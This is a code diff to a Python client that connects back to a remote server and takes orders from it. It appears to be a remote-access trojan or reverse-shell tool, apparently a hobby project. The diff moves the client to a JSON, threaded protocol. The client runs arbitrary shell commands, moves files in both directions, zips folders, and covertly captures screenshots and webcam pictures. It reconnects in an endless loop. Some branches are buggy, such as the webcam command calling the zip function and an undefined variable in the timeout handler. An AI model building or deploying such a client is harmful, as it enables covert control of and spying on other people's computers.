@@ -1,13 +1,15 @@
 #!/usr/bin/env python3
 # standard python libraries
 import time
+import threading
 import subprocess
 import base64
 import socket
 import sys
 import os
 import zipfile
-# non-standard libraries
+import json
+# non-standard python libraries
 import mss
 import cv2
 
@@ -18,72 +20,93 @@ class Client:
         self.exit = False
 
         while not self.exit:
-            received = self.connection.recv(self.connection.sock).decode(self.connection.CODEC)
-            command = received[0]
-            attribute = received[1:].split(" @ ")
+            request = self.dec_request(self.connection.recv(self.connection.sock))
+            self.response = {"data": str(), "error": str()}
 
-            if command == "c":
-                self.execute_command(attribute[0].split()[0], attribute[0][len(attribute[0].split()[0])+1:])
-            elif command == "d":
-                self.download_file(attribute[0])
-            elif command == "u":
-                self.upload_file(attribute[0])
-            elif command == "s":
-                self.make_screenshot(attribute[0].split()[0], attribute[0][len(attribute[0].split()[0])+1:])
-            elif command == "z":
-                self.zip_file_or_folder(attribute[0][0], attribute[0][1:], attribute[1])
-            elif command == "w":
-                self.capture_camera_picture(attribute[0].split()[0], attribute[0][len(attribute[0].split()[0])+1:])
-            elif command == "r":
-                self.connection.sock.close()
+            if request["cmd"] == "f":
+                process = threading.Thread(target=self.cwd, args=(request["mode"], request["path"],))
+                self.handle_process(process, request["timeout"])
+                self.connection.send(self.enc_response(self.response), self.connection.sock)
+            elif request["cmd"] == "c":
+                process = threading.Thread(target=self.execute_command, args=(request["exe"],))
+                self.handle_process(process, request["timeout"])
+                self.connection.send(self.enc_response(self.response), self.connection.sock)
+            elif request["cmd"] == "z":
+                process = threading.Thread(target=self.zip_file_or_folder, args=(request["comp_lvl"], request["open_path"], request["save_path"],))
+                self.handle_process(process, request["timeout"])
+                self.connection.send(self.enc_response(self.response), self.connection.sock)
+            elif request["cmd"] == "w":
+                process = threading.Thread(target=self.zip_file_or_folder, args=(request["cam_port"], request["save_path"],))
+                self.handle_process(process, request["timeout"])
+                self.connection.send(self.enc_response(self.response), self.connection.sock)
+            elif request["cmd"] == "s":
+                process = threading.Thread(target=self.make_screenshot, args=(request["monitor"], request["save_path"],))
+                self.handle_process(process, request["timeout"])
+                self.connection.send(self.enc_response(self.response), self.connection.sock)
+            elif request["cmd"] == "d":
+                self.download_file(request["open_path"])
+            elif request["cmd"] == "u":
+                self.upload_file(request["save_path"])
+            elif request["cmd"] == "r":
+                process = threading.Thread(target=self.connection.sock.close)
+                self.handle_process(process, request["timeout"])
                 self.exit = True
 
-    def execute_command(self, timeout, command):
+    def cwd(self, mode, path):
+        if mode == "set":
+            try:
+                os.chdir(path)
+            except FileNotFoundError:
+                self.response["error"] = "FileNotFoundError"
+            except PermissionError:
+                self.response["error"] = "PermissionError"
+        else:
+            self.response["data"] = os.getcwd()
+
+    def execute_command(self, command):
         try:
             process = subprocess.Popen(command, shell=True, stdout=subprocess.PIPE, stdin=subprocess.PIPE, stderr=subprocess.PIPE, universal_newlines=True)
-            process.wait(timeout=int(timeout))
-            data = process.stdout.read() + process.stderr.read()
+            self.response["data"] = process.stdout.read()
+            self.response["error"] = process.stderr.read()
         except UnicodeDecodeError:
-            data = "[-] UnicodeDecodeError"
-        except subprocess.TimeoutExpired:
-            data = "[-] TimeoutExpired"
-        self.connection.send(data.encode(self.connection.CODEC), self.connection.sock)
+            self.response["error"] = "UnicodeDecodeError"
 
     def download_file(self, path):
+        response = {"length": str(), "error": str()}
         try:
             with open(path, "rb") as file:
                 data = base64.b64encode(file.read()) + self.connection.END_MARKER
         except FileNotFoundError:
-            header = "[-] FileNotFoundError"
-            self.connection.send(header.encode(self.connection.CODEC), self.connection.sock)
+            response["error"] = "FileNotFoundError"
         except PermissionError:
-            header = "[-] PermissionError"
-            self.connection.send(header.encode(self.connection.CODEC), self.connection.sock)
+            response["error"] = "PermissionError"
         else:
-            header = str(len(data)).encode(self.connection.CODEC)
-            self.connection.send(header, self.connection.sock)
+            response["length"] = str(len(data))
+            self.connection.send(self.enc_response(response), self.connection.sock)
             self.connection.sock.send(data)
 
     def upload_file(self, path):
+        response = {"error": str()}
         data = self.connection.recv(self.connection.sock)
-        with open(path, "wb") as file:
-            file.write(data)
+        try:
+            with open(path, "wb") as file:
+                file.write(data)
+        except PermissionError:
+            response["error"] = "PermissionError"
+        self.connection.send(self.enc_response(response), self.connection.sock)
 
     def make_screenshot(self, monitor, path):
-        error = "no error"
         try:
             with mss.mss() as sct:
                 sct.shot(mon=int(monitor), output=path)
         except mss.exception.ScreenShotError:
-            error = "[-] MonitorDoesNotExist"
+            self.response["error"] = "MonitorDoesNotExist"
         except ValueError:
-            error = "[-] InvalidMonitorIndex"
+            self.response["error"] = "InvalidMonitorIndex"
         except FileNotFoundError:
-            error = "[-] FileNotFoundError"
-        self.connection.send(error.encode(self.connection.CODEC), self.connection.sock)
+            self.response["error"] = "FileNotFoundError"
 
     def zip_file_or_folder(self, compression_level, path_to_open, path_to_save):
-        error = "no error"
         try:
             zip_file = zipfile.ZipFile(path_to_save, 'w', zipfile.ZIP_DEFLATED, compresslevel=int(compression_level))
             if os.path.isdir(path_to_open):
@@ -95,25 +118,37 @@ class Client:
                 zip_file.write(path_to_open, os.path.basename(path_to_open))
             zip_file.close()
         except PermissionError:
-            error = "[-] PermissionError"
+            self.response["error"] = "PermissionError"
         except FileNotFoundError:
-            error = "[-] FileNotFoundError"
-        self.connection.send(error.encode(self.connection.CODEC), self.connection.sock)
+            self.response["error"] = "FileNotFoundError"
+        self.connection.send(self.enc_response(response), self.connection.sock)
 
     def capture_camera_picture(self, camera_port, path_to_save):
-        error = "no error"
         video_capture = cv2.VideoCapture(int(camera_port), cv2.CAP_DSHOW)
         if not video_capture.isOpened():
-            error = "[-] CouldNotOpenDevice"
-            self.connection.send(error.encode(self.connection.CODEC), self.connection.sock)
+            self.response["error"] = "CouldNotOpenDevice"
             return
         success, frame = video_capture.read()
         if not success:
-            error = "[-] UnableToCapturePicture"
+            self.response["error"] = "UnableToCapturePicture"
         video_capture.release()
         cv2.destroyAllWindows()
         cv2.imwrite(path_to_save, frame)
-        self.connection.send(error.encode(self.connection.CODEC), self.connection.sock)
+        # TODO error handeling
+
+    def handle_process(self, process, timeout):
+        process.start()
+        process.join(timeout)
+        if process.is_alive():
+            self.response["data"] = ""
+            self.response["error"] = "TimeoutExpired"
+            self.connection.send(self.enc_response(response), self.connection.sock)
+
+    def dec_request(self, request):
+        return json.loads(request.decode(self.connection.CODEC))
+
+    def enc_response(self, response):
+        return json.dumps(response).encode(self.connection.CODEC)
 
 
 class Connection:
@@ -123,7 +158,7 @@ class Connection:
         self.PACKET_SIZE = 1024
 
         HOST = "127.0.0.1"
-        PORT = 10009
+        PORT = 10001
 
         if len(sys.argv) == 3:
             try:
@@ -154,9 +189,9 @@ class Connection:
 
 if __name__ == "__main__":
     while True:
-        try:
-            client = Client()
-            if client.exit:
-                break
-        except:
-            pass
+        #try:
+        client = Client()
+            #if client.exit:
+                #break
+        #except:
+            #pass
